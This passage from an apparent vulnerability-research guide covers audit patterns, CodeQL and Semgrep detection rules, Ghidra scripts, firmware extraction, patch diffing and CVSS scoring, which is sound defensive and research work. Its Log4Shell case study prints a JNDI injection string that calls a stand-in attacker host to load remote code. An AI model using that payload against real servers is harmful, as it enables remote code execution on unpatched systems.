**CVE-2021-22555: Netfilter setsockopt out-of-bounds write.** Discovered initially through manual audit of the IPT_SO_SET_REPLACE path in Netfilter, but Syzkaller's syzbot infrastructure independently found variants. The vulnerability was a heap out-of-bounds write in `xt_compat_target_from_user()` — the compat (32-bit on 64-bit) translation of Netfilter rules wrote past the allocated buffer due to incorrect size calculations. The bug had existed since Linux 2.6.19 (2006) and was exploitable for container escape from unprivileged user namespaces. The fix corrected the size calculation in the compat translation layer. CVSS 3.1: 7.8 (High).

**CVE-2022-27666: ESP transformation heap buffer overflow.** syzbot (Syzkaller's continuous fuzzing infrastructure for the Linux kernel) discovered a heap buffer overflow in the IPsec ESP (Encapsulating Security Payload) transformation. When processing ESP packets, the kernel's `esp_output_head()` function could allocate an insufficiently-sized buffer for the encrypted output if the payload exceeded a certain threshold. The subsequent encryption operation wrote past the buffer boundary. The fix added proper size validation before the allocation. CVSS 3.1: 7.8 (High).

These three CVEs share a pattern: the vulnerability is a bounds-check error in a code path that processes structured input (mount parameters, netfilter rules, ESP packets). The fuzzer's coverage-guided exploration systematically reached these paths by generating valid-enough syscall sequences to pass initial validation, while the sanitizer (KASAN) detected the out-of-bounds access that would otherwise manifest as silent memory corruption.

---

## 3. Code auditing

### 3.1 Manual review patterns

Experienced auditors search for specific vulnerability patterns:

**Use-After-Free (UAF).** The object is freed, but a pointer to it is retained and later dereferenced. Audit pattern: trace the lifecycle of dynamically-allocated objects — identify all allocation sites (`malloc`, `kmalloc`, `new`, `kzalloc`), all free sites (`free`, `kfree`, `delete`), and all use sites (dereferences, member access). A UAF exists if a use site can be reached after a free site without an intervening reallocation. In kernel code, reference-counted objects (with `kref`, `refcount_t`) are a common source: if the reference count is decremented before a pointer is used (without holding a reference), a UAF can occur.

**Double-free.** The same object is freed twice. Audit pattern: identify error-handling paths where cleanup code frees an object that was already freed in the normal path (or in a different error path). In C code, this often occurs in functions with multiple `goto cleanup` labels where the cleanup code frees a pointer that may or may not have been allocated.

**Race conditions.** Two threads access shared data without proper synchronization, and at least one access is a write. Audit pattern: identify shared state (global variables, struct fields accessed by multiple threads, resources accessible via multiple file descriptors), identify the synchronization mechanisms (mutexes, spinlocks, RCU, atomic operations), and check for windows where the state is accessed without the lock held. TOCTOU (Time-of-Check-Time-of-Use) is a specific race-condition pattern: the program checks a condition (e.g., file permissions), then uses the resource (e.g., opens the file) — but the condition may have changed between the check and the use (e.g., a symlink was swapped). In the kernel, `copy_from_user` / `copy_to_user` introduce TOCTOU windows if the userspace memory is re-read after validation.

**Integer overflow.** Arithmetic on integer values that wraps around or truncates. Audit pattern: identify arithmetic operations on user-controlled values (sizes, counts, offsets) that are used for memory allocation (`malloc(n * sizeof(type))` — if `n * sizeof(type)` overflows to a small value, the allocation is too small, and subsequent writes overflow the buffer) or for bounds checking (`if (offset + len <= buf_size)` — if `offset + len` overflows and wraps to a small value, the check passes even though the actual range exceeds the buffer).

**Logic bugs.** Incorrect authorization checks, missing validation, wrong comparison operators (`=` vs `==`, `<` vs `<=`), off-by-one errors, and incorrect state-machine transitions. Logic bugs are the hardest to find systematically because they depend on the program's intended behavior (which the auditor must understand) rather than on mechanical patterns.

### 3.2 Source code audit methodology per vulnerability class

Beyond knowing the patterns, the auditor needs a systematic approach to search for them in large codebases.

**For heap buffer overflows,** grep for allocation calls and trace the size argument backward to determine whether it can be attacker-influenced. The critical search patterns:

```bash
# Find allocations where size comes from user input
grep -rn 'malloc\|calloc\|realloc\|kmalloc\|kzalloc\|kvmalloc' src/
# For each hit, trace the size argument:
# - Does it come from a parsed field (Content-Length, packet length)?
# - Is there arithmetic on it before the allocation?
# - Is the result checked against the actual data written?
```

The most dangerous pattern is multiplication before allocation: `malloc(count * elem_size)` where both `count` and `elem_size` come from parsed input. If their product overflows the integer type (wrapping to a small value), the allocation is too small. The `calloc` function avoids this by checking for overflow internally, but `malloc(n * m)` does not.

**For format string bugs,** search for printf-family calls where the format argument is not a literal string:

```bash
grep -rn 'printf\|fprintf\|sprintf\|snprintf\|syslog\|err\|warn' src/ \
    | grep -v '".*%'
# Lines where the first argument is a variable, not a string literal
```

**For command injection,** search for calls to `system()`, `popen()`, `exec*()` family functions where the argument is constructed from user input:

```bash
grep -rn 'system\|popen\|exec[lv]p\?\|ShellExecute' src/
```

**For SQL injection in web applications,** search for string concatenation in database queries:

```bash
grep -rn 'execute\|query\|cursor\|prepare' src/ \
    | grep -E '(\+|%|\.format|f")'
```

### 3.3 CodeQL

CodeQL (GitHub/Semmle) is a semantic code-analysis engine. The source code is compiled into a relational database (the "CodeQL database"); the analyst writes queries in QL (a Datalog-like declarative query language) to find vulnerability patterns.

**QL language.** QL queries define predicates over the code's AST, data flow, and control flow. Example (simplified): "Find all calls to `memcpy` where the `size` argument is derived from user input without bounds checking":
```
from FunctionCall call, DataFlow::Node source, DataFlow::Node sink
where call.getTarget().hasName("memcpy")
  and sink.asExpr() = call.getArgument(2)  // size argument
  and source = userInput()                  // defined elsewhere
  and DataFlow::localFlow(source, sink)     // taint reaches size
select call, "Potentially unsafe memcpy with user-controlled size"
```

**Libraries.** CodeQL provides libraries for: AST navigation (accessing functions, classes, expressions, statements), data-flow analysis (tracking how values flow through assignments, function calls, and returns — both local and global/interprocedural), taint tracking (tracking user-controlled data through transformations — sanitizers are modeled as removing taint), and control-flow analysis (determining reachability, dominance, and loop structure).

**Variant analysis.** CodeQL's primary use case in vulnerability research: after a vulnerability is found manually, the researcher writes a CodeQL query that captures the vulnerability's pattern, then runs the query against the entire codebase (or across many codebases) to find all variant instances of the same pattern. This is how Google's Project Zero and GitHub Security Lab systematically find vulnerability variants at scale.

### 3.4 CodeQL working queries

The following queries use the CodeQL standard libraries for C/C++. Each query is a complete, functional QL file that can be run against any C/C++ CodeQL database. The database is created with:

```bash
codeql database create mydb --language=cpp --command="make -j$(nproc)"
codeql database analyze mydb query.ql --format=csv --output=results.csv
```

**Query 1: Use-After-Free detection.** This query identifies cases where a pointer is dereferenced after the memory it points to has been freed. It uses local data-flow analysis to track pointers from `free()` call sites to subsequent dereferences.

```ql
/**
 * @name Use-after-free
 * @description Finds pointer dereferences that may occur after
 *              the pointed-to memory has been freed.
 * @kind problem
 * @problem.severity error
 * @id cpp/use-after-free
 */
import cpp
import semmle.code.cpp.dataflow.DataFlow
import semmle.code.cpp.controlflow.Guards

/**
 * A call to free() or a similar deallocation function.
 */
class FreeCall extends FunctionCall {
  FreeCall() {
    this.getTarget().hasName(["free", "kfree", "vfree", "kvfree"])
  }

  Expr getFreedArg() { result = this.getArgument(0) }
}

/**
 * Holds if `deref` dereferences a pointer that was previously
 * freed at `freeCall`, and both operate on the same variable
 * `v`, with `deref` reachable from `freeCall` without an
 * intervening reassignment of `v`.
 */
predicate useAfterFree(FreeCall freeCall, Expr deref, Variable v) {
  exists(VariableAccess freeAccess, VariableAccess useAccess |
    freeAccess = freeCall.getFreedArg() and
    freeAccess.getTarget() = v and
    useAccess.getTarget() = v and
    (
      useAccess = deref.(PointerDereferenceExpr).getOperand()
      or
      useAccess = deref.(PointerFieldAccess).getQualifier()
    ) and
    freeAccess.getASuccessor+() = useAccess and
    not exists(AssignExpr assign |
      assign.getLValue().(VariableAccess).getTarget() = v and
      freeAccess.getASuccessor+() = assign and
      assign.getASuccessor+() = useAccess
    )
  )
}

from FreeCall fc, Expr deref, Variable v
where useAfterFree(fc, deref, v)
select deref,
  "Potential use-after-free: variable '" + v.getName() +
  "' is dereferenced here after being freed at " +
  fc.getLocation().toString()
```

This query catches the pattern where `free(ptr)` is followed by `ptr->field` or `*ptr` without an intervening reassignment of `ptr`. It found variants of UAF patterns similar to CVE-2019-5786 (Chrome FileReader UAF) during variant analysis across Chromium's codebase.

**Query 2: SQL injection via taint tracking.** This query tracks user input from HTTP request parameters to SQL query execution calls, flagging cases where the input reaches the query without parameterization.

```ql
/**
 * @name SQL injection from user input
 * @description Finds SQL queries constructed from user-controlled input
 *              without proper parameterization.
 * @kind path-problem
 * @problem.severity error
 * @id cpp/sql-injection
 */
import cpp
import semmle.code.cpp.dataflow.TaintTracking
import DataFlow::PathGraph

class SqlInjectionConfig extends TaintTracking::Configuration {
  SqlInjectionConfig() { this = "SqlInjectionConfig" }

  override predicate isSource(DataFlow::Node source) {
    exists(FunctionCall fc |
      fc.getTarget().hasName([
        "getenv", "readline", "fgets", "recv", "read",
        "getQueryParam", "getRequestBody"
      ]) and
      source.asExpr() = fc
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(FunctionCall fc |
      fc.getTarget().hasName([
        "mysql_query", "sqlite3_exec", "PQexec",
        "mysql_real_query", "sqlite3_prepare"
      ]) and
      sink.asExpr() = fc.getArgument(1)
    )
  }

  override predicate isSanitizer(DataFlow::Node node) {
    exists(FunctionCall fc |
      fc.getTarget().hasName([
        "mysql_real_escape_string",
        "sqlite3_mprintf", "PQescapeLiteral"
      ]) and
      node.asExpr() = fc
    )
  }
}

from SqlInjectionConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink,
  "SQL query uses unsanitized input from $@.",
  source.getNode(), "user-controlled source"
```

**Query 3: Command injection.** This query finds flows from user input to shell command execution.

```ql
/**
 * @name Command injection
 * @description Finds system() or popen() calls with
 *              user-controlled arguments.
 * @kind path-problem
 * @problem.severity error
 * @id cpp/command-injection
 */
import cpp
import semmle.code.cpp.dataflow.TaintTracking
import DataFlow::PathGraph

class CommandInjectionConfig extends TaintTracking::Configuration {
  CommandInjectionConfig() { this = "CommandInjectionConfig" }

  override predicate isSource(DataFlow::Node source) {
    exists(FunctionCall fc |
      fc.getTarget().hasName([
        "getenv", "recv", "read", "fgets", "gets",
        "scanf", "fread"
      ]) and
      source.asExpr() = fc
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(FunctionCall fc |
      fc.getTarget().hasName(["system", "popen", "execl",
        "execlp", "execle", "execv", "execvp", "execvpe"]) and
      sink.asExpr() = fc.getArgument(0)
    )
  }

  override predicate isSanitizer(DataFlow::Node node) {
    /* No standard sanitizer for shell commands —
       the only safe pattern is avoiding shell entirely
       (use execve with argv array). Flag all flows. */
    none()
  }
}

from CommandInjectionConfig cfg, DataFlow::PathNode source,
     DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink,
  "Shell command constructed from $@.",
  source.getNode(), "user-controlled input"
```

Command injection queries are particularly effective for discovering vulnerabilities like CVE-2021-25646 (Apache Druid RCE), where user-supplied JavaScript in HTTP API requests reached `Runtime.exec()` through the Druid JavaScript engine — a textbook case of unsanitized input flowing to OS command execution.

**Query 4: Path traversal.** This query identifies file operations where the path argument is derived from user input without proper canonicalization.

```ql
/**
 * @name Path traversal
 * @description Finds file operations using unsanitized paths
 *              derived from user input.
 * @kind path-problem
 * @problem.severity error
 * @id cpp/path-traversal
 */
import cpp
import semmle.code.cpp.dataflow.TaintTracking
import DataFlow::PathGraph

class PathTraversalConfig extends TaintTracking::Configuration {
  PathTraversalConfig() { this = "PathTraversalConfig" }

  override predicate isSource(DataFlow::Node source) {
    exists(FunctionCall fc |
      fc.getTarget().hasName([
        "getenv", "recv", "read", "fgets",
        "getQueryParam", "getPathInfo"
      ]) and
      source.asExpr() = fc
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(FunctionCall fc |
      fc.getTarget().hasName([
        "fopen", "open", "openat", "creat", "access",
        "stat", "lstat", "unlink", "rename", "mkdir",
        "chmod", "chown"
      ]) and
      sink.asExpr() = fc.getArgument(0)
    )
  }

  override predicate isSanitizer(DataFlow::Node node) {
    exists(FunctionCall fc |
      fc.getTarget().hasName(["realpath", "canonicalize_file_name"]) and
      node.asExpr() = fc
    )
  }
}

from PathTraversalConfig cfg, DataFlow::PathNode source,
     DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink,
  "File operation uses path derived from $@.",
  source.getNode(), "user input"
```

**Query 5: Integer overflow in allocation size.** This query detects the pattern `malloc(a * b)` where the multiplication can overflow, producing a too-small allocation.

```ql
/**
 * @name Integer overflow in allocation size
 * @description Finds malloc/realloc calls where the size argument
 *              involves multiplication that may overflow.
 * @kind problem
 * @problem.severity error
 * @id cpp/alloc-size-overflow
 */
import cpp

/** The size argument of an allocation function. */
Expr allocSizeArg(FunctionCall alloc) {
  alloc.getTarget().hasName(["malloc", "kmalloc", "kzalloc", "kvmalloc"])
  and result = alloc.getArgument(0)
  or
  alloc.getTarget().hasName("realloc")
  and result = alloc.getArgument(1)
}

from FunctionCall alloc, MulExpr mul
where
  mul = allocSizeArg(alloc) and
  /* At least one operand is not a compile-time constant
     small enough to preclude 32/64-bit overflow */
  not (
    mul.getLeftOperand().getValue().toInt() < 4096 and
    mul.getRightOperand().getValue().toInt() < 4096
  )
select alloc,
  "Allocation size computed by multiplication $@ — " +
  "potential integer overflow if operands are user-controlled.",
  mul, mul.toString()
```

This pattern catches bugs like CVE-2006-3459 (libtiff `TIFFFetchShortPair` integer overflow) where attacker-controlled image dimensions were multiplied by bytes-per-pixel to compute a buffer size, and the product overflowed to a small value, causing a heap buffer overflow.

### 3.5 Semgrep advanced patterns

Semgrep (r2c/Semgrep Inc.) is a lightweight, pattern-based static-analysis tool. Semgrep rules specify patterns in a syntax that mirrors the target language's code:

```yaml
rules:
  - id: dangerous-eval
    pattern: eval($X)
    message: "Dangerous use of eval with $X"
    languages: [python]
    severity: WARNING
```

**Metavariables** (`$X`, `$FUNC`, `$ARG`) match any expression/identifier. **Ellipsis** (`...`) matches any sequence of statements or arguments. **Metavariable typing** (`metavariable-type: $X: int`) restricts matches by type.

**Taint mode configuration.** Semgrep's taint mode enables interprocedural data-flow tracking — tracking user input from sources through transformations to dangerous sinks. The configuration requires defining sources, sinks, propagators (functions that pass taint from input to output), and sanitizers (functions that neutralize taint):

```yaml
rules:
  - id: tainted-sql-query
    mode: taint
    message: "User input flows to SQL query without sanitization"
    languages: [python]
    severity: ERROR
    pattern-sources:
      - patterns:
          - pattern: flask.request.$ATTR
      - patterns:
          - pattern: request.args.get(...)
      - patterns:
          - pattern: request.form[...]
    pattern-sinks:
      - patterns:
          - pattern: cursor.execute($QUERY, ...)
            focus-metavariable: $QUERY
      - patterns:
          - pattern: db.engine.execute($QUERY)
            focus-metavariable: $QUERY
    pattern-propagators:
      - pattern: $TO = $FROM.format(...)
        from: $FROM
        to: $TO
      - pattern: $TO = f"...{$FROM}..."
        from: $FROM
        to: $TO
    pattern-sanitizers:
      - patterns:
          - pattern: bleach.clean(...)
      - patterns:
          - pattern: escape(...)
```

**Metavariable-comparison for numeric bounds.** Semgrep can match patterns where a numeric value exceeds a threshold, useful for finding insecure configurations:

```yaml
rules:
  - id: weak-bcrypt-rounds
    patterns:
      - pattern: bcrypt.hashpw($PW, bcrypt.gensalt(rounds=$ROUNDS))
      - metavariable-comparison:
          metavariable: $ROUNDS
          comparison: $ROUNDS < 12
    message: "bcrypt rounds ($ROUNDS) is below recommended minimum of 12"
    languages: [python]
    severity: WARNING
```

**Autofix patterns.** Semgrep can automatically generate fixes for matched vulnerabilities:

```yaml
rules:
  - id: use-parameterized-query
    pattern: |
      cursor.execute("..." + $INPUT + "...")
    fix: |
      cursor.execute("... %s ...", ($INPUT,))
    message: "Use parameterized queries to prevent SQL injection"
    languages: [python]
    severity: ERROR
```

**Join mode for cross-file analysis.** Semgrep's join mode correlates findings across multiple rules to detect patterns that span files — for example, an endpoint that lacks authentication AND handles sensitive data:

```yaml
rules:
  - id: unauthenticated-sensitive-endpoint
    mode: join
    join:
      rules:
        - id: missing-auth-decorator
          patterns:
            - pattern: |
                @app.route($PATH)
                def $FUNC(...):
                    ...
            - pattern-not: |
                @login_required
                @app.route($PATH)
                def $FUNC(...):
                    ...
          languages: [python]
        - id: accesses-user-data
          pattern: |
            def $FUNC(...):
                ...
                User.query.$METHOD(...)
                ...
          languages: [python]
      on:
        - "missing-auth-decorator.$FUNC == accesses-user-data.$FUNC"
    message: "Function $FUNC accesses user data without authentication"
    severity: ERROR
```

### 3.6 Real-world CVE audit case studies

**CVE-2021-3156: sudoedit heap overflow (Baron Samedit).** Qualys researchers discovered this vulnerability through manual source-code audit of sudo. The discovery process involved systematic review of command-line argument processing in `sudoers.c`. The vulnerability existed in the `set_cmnd()` function, which parsed command-line arguments for `sudoedit` (sudo's editor mode). When backslash-escaped characters appeared in command arguments, the function calculated the required buffer size by counting backslashes, then allocated a buffer and copied the arguments while un-escaping. The bug was a mismatch: the size calculation correctly counted backslashes, but the copy loop's termination condition differed from the allocation calculation — specifically, when `sudoedit` was invoked (as opposed to `sudo`), the parser continued copying past where the size calculation stopped, causing a heap overflow. The auditors found the bug by: (1) identifying `set_cmnd()` as a high-value target (it processes user-controlled command-line input in a setuid binary), (2) tracing the size computation vs. the copy loop character by character, and (3) recognizing that the `sudoedit` code path had a different loop condition than the `sudo` code path, but both shared the same size calculation. The bug had existed since July 2011 (sudo 1.8.2). CWE-122 (heap buffer overflow). CVSS 3.1: 7.8.

**CVE-2021-44228: Log4Shell.** This vulnerability in Apache Log4j 2 was discovered by Chen Zhaojun of the Alibaba Cloud Security Team. The discovery involved recognizing that Log4j's message-lookup substitution feature processed JNDI (Java Naming and Directory Interface) references in log messages. The lookup syntax `${jndi:ldap://attacker.com/exploit}` embedded in any logged string (user-agent headers, form fields, error messages — any input that reached a `log.info()`, `log.error()`, etc. call) caused Log4j to perform an LDAP query to the attacker's server. The LDAP response could direct the application to load and instantiate an arbitrary Java class from a remote URL — achieving remote code execution. The auditor's insight was recognizing the interaction between two seemingly-benign features: message lookup substitution (designed for convenient variable expansion in log messages) and JNDI lookup (designed for accessing naming/directory services). Neither feature was inherently dangerous alone; the vulnerability emerged from their composition — the lookup substitution was recursive and processed untrusted input, and the JNDI lookup performed network operations and class loading as a side effect. CWE-917 (improper neutralization of special elements used in an expression language statement). CVSS 3.1: 10.0 (Critical).

---

## 4. Binary auditing

### 4.1 Dangerous function identification

The auditor loads the binary in Ghidra, IDA Pro, or Binary Ninja and searches for calls to known-dangerous functions: `memcpy`, `memmove`, `strcpy`, `strncpy`, `sprintf`, `snprintf`, `gets`, `scanf`, `free`, `realloc`, `malloc`, `calloc`. For each call site, the auditor traces the arguments backward (where does the size/format/pointer come from?) to determine if any argument is attacker-controlled.

**Cross-references.** The decompiler's cross-reference (xref) feature identifies all callers of a function and all references to a data object. The auditor uses xrefs to: find all call sites of a dangerous function, trace a function pointer's assignment and invocation sites, and follow data flow through struct fields.

### 4.2 Data-flow tracing in binaries

Without source code, the auditor manually traces data flow through the decompiled code: from input sources (network `recv`, file `read`, `ioctl` arguments, HTTP request parameters) through transformations (parsing, copying, arithmetic) to sinks (memory writes, function pointers, system calls). Binary Ninja's MLIL/HLIL and Ghidra's decompiler output provide variable-level data-flow visibility; the auditor identifies: which variables carry attacker-controlled data, whether those variables are validated before use, and whether the validation is correct and complete.

### 4.3 Identifying vulnerability patterns

**Heap overflow via undersized allocation.** The auditor identifies `malloc(size)` where `size` is computed from attacker-controlled input. If `size` can be manipulated (via integer overflow, truncation, or incorrect calculation) to be smaller than the actual data written to the buffer, a heap overflow results.

**UAF via reference counting.** In C++ or kernel code, the auditor identifies objects with reference counts and traces: increment sites (`AddRef`, `kref_get`, `refcount_inc`), decrement sites (`Release`, `kref_put`, `refcount_dec_and_test`), and use sites. If a use site can be reached after the reference count reaches zero (and the destructor/free has been called), a UAF exists.

**Type confusion.** In C++ code with virtual functions, the auditor identifies casts (explicit `static_cast`, `reinterpret_cast`, or implicit C-style casts) between class types. If an object of type A is cast to type B (which has a different vtable layout), the vtable pointer is misinterpreted, and virtual-method calls dispatch to incorrect functions — potentially attacker-controlled if the object's memory is spray-controlled.

### 4.4 Patch diffing with BinDiff

BinDiff (Zynamics/Google) compares two versions of a binary to identify functions that were added, removed, or modified. In vulnerability research, patch diffing is the primary technique for 1-day analysis: comparing a pre-patch binary against a post-patch binary to identify exactly which functions were modified by a security fix.

**Setup and workflow.** BinDiff operates on exported analysis databases from IDA Pro or Ghidra. The workflow is:

```
1. Obtain the pre-patch and post-patch binaries
   (e.g., two firmware versions, two library releases, two Windows DLLs
   from consecutive Patch Tuesday updates).

2. Load each binary into IDA Pro (or Ghidra with BinExport plugin).

3. Export .BinExport files:
   IDA: Edit → Plugins → BinExport → Export as BinExport
   Ghidra: via BinExport plugin's export script

4. Run BinDiff comparison:
   bindiff /path/to/old.BinExport /path/to/new.BinExport

5. Open the resulting .BinDiff file in BinDiff's UI
   (or in IDA's BinDiff plugin for side-by-side view).
```

BinDiff classifies function matches by similarity score (0.0 to 1.0). Functions with similarity below 1.0 contain changes. The researcher focuses on: functions with similarity 0.70–0.99 (modified — likely the security fix), functions present only in the new binary (added — possibly new validation or sanitization), and functions present only in the old binary (removed — possibly the vulnerable code path was eliminated).

**Identifying security-relevant changes.** The researcher examines each modified function's diff to find: added bounds checks (`if (size > MAX_SIZE) return -EINVAL`), added null-pointer checks, changed arithmetic operations (replacing `malloc(n * size)` with `calloc(n, size)`), added sanitization calls, and permission checks that were missing in the old version.

### 4.5 Diaphora

Diaphora is an IDA Pro plugin for binary diffing that provides finer-grained matching than BinDiff. It classifies matches into three categories:

**Best matches** (high confidence): functions with identical or near-identical control-flow graphs and instruction sequences. These are unchanged or trivially modified.

**Partial matches** (medium confidence): functions with similar structure but differences in instruction-level details (changed constants, added branches, modified call targets). These are the primary targets for security analysis — they often contain the actual patch.

**Unreliable matches** (low confidence): functions that share a name or some basic-block similarity but have substantially different structures. These require manual verification.

Diaphora also performs: pseudo-code diffing (comparing Hex-Rays decompiler output rather than assembly, which is more readable), call-graph analysis (identifying changes in the call relationships between functions), and heuristic matching for functions that were inlined, split, or merged between versions.

### 4.6 Ghidra scripting for vulnerability hunting

Ghidra's Java and Python (Jython) scripting APIs enable automated analysis of binaries. The following scripts automate common vulnerability-hunting tasks.

**Script 1: Finding dangerous function calls with cross-reference analysis.**

```python
# ghidra_find_dangerous_calls.py — Ghidra Jython script
# Run via: Ghidra → Script Manager → Run

from ghidra.program.model.symbol import SourceType
from ghidra.program.util import DefinedDataIterator

DANGEROUS_FUNCS = [
    "strcpy", "strcat", "sprintf", "gets", "scanf",
    "vsprintf", "sscanf", "fscanf",
    "memcpy", "memmove", "strncpy",
    "system", "popen", "execve",
]

fm = currentProgram.getFunctionManager()
listing = currentProgram.getListing()
refMgr = currentProgram.getReferenceManager()

for funcName in DANGEROUS_FUNCS:
    funcs = getGlobalFunctions(funcName)
    for func in funcs:
        refs = getReferencesTo(func.getEntryPoint())
        for ref in refs:
            caller = fm.getFunctionContaining(ref.getFromAddress())
            callerName = caller.getName() if caller else "unknown"
            print("[!] %s called from %s at %s" %
                  (funcName, callerName, ref.getFromAddress()))
```

**Script 2: Batch analysis for firmware images.** When analyzing a firmware bundle containing dozens of ELF binaries, Ghidra's headless analyzer can process them in batch:

```bash
# Headless batch analysis with post-analysis script
/opt/ghidra/support/analyzeHeadless \
    /tmp/ghidra_project FirmwareProject \
    -import /extracted/firmware/usr/bin/* \
    -postScript ghidra_find_dangerous_calls.py \
    -scriptlog /tmp/analysis_results.log \
    -deleteProject
```

### 4.7 IDA Pro and Binary Ninja ecosystem

**IDA Pro — Lighthouse.** Lighthouse is a code-coverage visualization plugin for IDA Pro. It reads coverage data from DynamoRIO, Intel Pin, or Frida and highlights executed basic blocks in the IDA disassembly view. The researcher uses Lighthouse to: visualize which code paths the fuzzer has reached (overlaying AFL++'s coverage data on IDA's CFG), identify uncovered code regions for manual audit, and compare coverage between different inputs to understand input-dependent behavior. Coverage data is loaded from `.drcov` files (DynamoRIO format):

```
# Generate coverage with DynamoRIO
drrun -t drcov -- ./target input_file
# Load the .drcov file in IDA via Lighthouse → Load Coverage
```

**IDA Pro — BinSync.** BinSync enables collaborative reverse engineering by synchronizing analysis artifacts (function names, comments, type annotations, struct definitions) across multiple IDA instances via a Git repository. For vulnerability research teams, BinSync allows one researcher to annotate input-handling functions while another annotates memory management, with both merging into a shared analysis database.

**Binary Ninja HLIL/MLIL API.** Binary Ninja's intermediate languages (Medium-Level IL, High-Level IL) provide variable-level and structured control-flow representations of binary code. The Python API enables programmatic vulnerability hunting: iterating over functions and HLIL instructions, identifying calls to dangerous functions, and tracing argument origins. The MLIL is particularly useful for automated taint analysis because it eliminates stack-frame noise and exposes clean variable-to-variable data flow.

### 4.8 Firmware extraction and analysis

Before a firmware binary can be loaded into a disassembler, it must be extracted from its container format. Firmware images use various packaging schemes: plain ELF binaries, compressed filesystems (SquashFS, JFFS2, UBIFS, CramFS), custom headers, and sometimes encryption.

**binwalk** is the standard tool for firmware analysis. It identifies embedded file signatures, compressed archives, and filesystem images within a firmware blob:

```bash
# Scan for embedded signatures
binwalk firmware.bin
# Output: offset, description (e.g., "SquashFS filesystem at 0x120000")

# Extract all identified components
binwalk -e firmware.bin
# Creates _firmware.bin.extracted/ with extracted files

# Deep extraction with specific format handlers
binwalk --dd='.*' firmware.bin

# Entropy analysis (identifies compressed/encrypted regions)
binwalk -E firmware.bin
# High-entropy regions (>0.9) suggest compression or encryption
# Flat high entropy across the entire image suggests encryption
```

Format-specific tools handle the common embedded filesystems:

```bash
jefferson firmware.jffs2 -d /tmp/jffs2_extracted/       # JFFS2
ubireader_extract_files firmware.ubi -o /tmp/ubi_files/  # UBI/UBIFS
unsquashfs -d /tmp/squashfs_root/ filesystem.squashfs    # SquashFS
```

After extraction, the researcher has a directory tree containing the firmware's binaries, configuration files, web server content, and sometimes hardcoded credentials or private keys. The analysis proceeds: identify the main application binaries (often in `/usr/bin/` or `/usr/sbin/`), identify listening network services (`grep -r "bind\|listen\|accept" /tmp/extracted/`), and load the most exposed binaries into a disassembler.

### 4.9 1-day analysis workflow

1-day analysis is the process of understanding a patched vulnerability from the patch alone, without the original vulnerability disclosure. The goal is to develop a working understanding (and potentially a proof-of-concept) before most systems are patched. The workflow:

**Step 1: Obtain pre-patch and post-patch artifacts.** For Windows: download the `.msu` update package from the Microsoft Update Catalog, extract the updated DLLs with `expand -F:* update.msu /tmp/extracted/`. For Linux: obtain the source diff from the project's Git repository (`git log --oneline --diff-filter=M security_fix_commit`). For firmware: obtain two firmware versions from the vendor's download page.

**Step 2: Identify the changed functions.** Run BinDiff or Diaphora on the two versions. Sort by similarity score ascending — the most-changed functions are at the top. Filter out functions that are obviously non-security (version strings, copyright updates, feature additions) and focus on functions in security-relevant subsystems (parsers, authentication, memory management).

**Step 3: Understand the vulnerability.** For each changed function, compare the pre-patch and post-patch code side by side. Identify what the patch adds: a missing bounds check, a new validation, a corrected arithmetic operation, an added lock acquisition. The patch tells you exactly what was wrong — the absence of the added check in the pre-patch code is the vulnerability.

**Step 4: Determine reachability.** Trace backward from the vulnerable function to determine: which external inputs reach it (network packets, file contents, API calls), what preconditions are required (authentication, specific protocol state), and whether the vulnerability is reachable in default configurations.

**Step 5: Assess severity.** Based on the vulnerability class (buffer overflow, UAF, logic bug), the reachability (remote unauthenticated vs. local privileged), and the affected component (kernel, browser, server, library), estimate the CVSS score and exploitability.

---

## 5. Vulnerability discovery program design

### 5.1 Campaign planning

Effective vulnerability discovery is not ad hoc — it requires deliberate campaign planning that allocates resources across complementary techniques.

**Target prioritization.** The researcher evaluates potential targets along several axes: attack surface breadth (how many entry points accept untrusted input), code complexity (measured by cyclomatic complexity, number of conditional branches, and codebase size), deployment reach (how many systems run the software — a bug in OpenSSL has vastly more impact than a bug in a niche FTP server), historical vulnerability density (projects with recent CVEs tend to have more undiscovered bugs in adjacent code), and bounty value (if the research is commercially motivated). A weighted scoring model across these axes produces a ranked target list.

**Technique allocation.** Different vulnerability classes are found by different techniques. Coverage-guided fuzzing excels at finding memory-corruption bugs (buffer overflows, UAFs, integer overflows) in C/C++ code that processes binary formats. Static analysis (CodeQL, Semgrep) excels at finding injection vulnerabilities (SQL, command, path traversal) and logic bugs in web applications. Manual audit excels at finding authentication bypasses, TOCTOU races, and subtle logic errors that tools miss. The campaign plan allocates time across these techniques based on the target's characteristics.

**Combining techniques.** The most effective approach chains techniques together. Static analysis identifies candidate vulnerability locations (e.g., a CodeQL query flags a `memcpy` call with attacker-influenced size). The researcher then writes a targeted fuzz harness that exercises specifically that code path, using the static analysis finding to guide corpus construction and dictionary generation. If the fuzzer confirms the bug (produces a crashing input), the researcher performs manual audit to understand the full scope and identify variant instances. This pipeline — static analysis for triage, targeted fuzzing for confirmation, manual audit for completeness — is more efficient than applying each technique independently.

### 5.2 Vulnerability scoring with CVSS 4.0

CVSS 4.0 (released November 2023, superseding CVSS 3.1) restructured the scoring framework into four metric groups: Base (intrinsic vulnerability characteristics), Threat (current exploitation landscape), Environmental (organization-specific context), and Supplemental (additional descriptive metadata).

**Base metrics walkthrough.** Consider a heap buffer overflow in an HTTP server's request parser, reachable by an unauthenticated remote attacker. CVSS 4.0 replaces the old Scope metric with separate impact metrics for the Vulnerable System and Subsequent Systems:

```
AV:Network  AC:Low  AT:None  PR:None  UI:None
VC:High  VI:High  VA:High  SC:None  SI:None  SA:None
→ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N = 9.3 (Critical)
```

**Threat metrics.** CVSS 4.0 replaces the old Temporal metrics with a single Threat metric: Exploit Maturity (E), which takes values of `Unreported`, `Proof-of-Concept`, `Attacked`, or `Not Defined`. The Exploit Maturity adjusts the score based on whether exploitation is theoretical, demonstrated, or actively occurring.

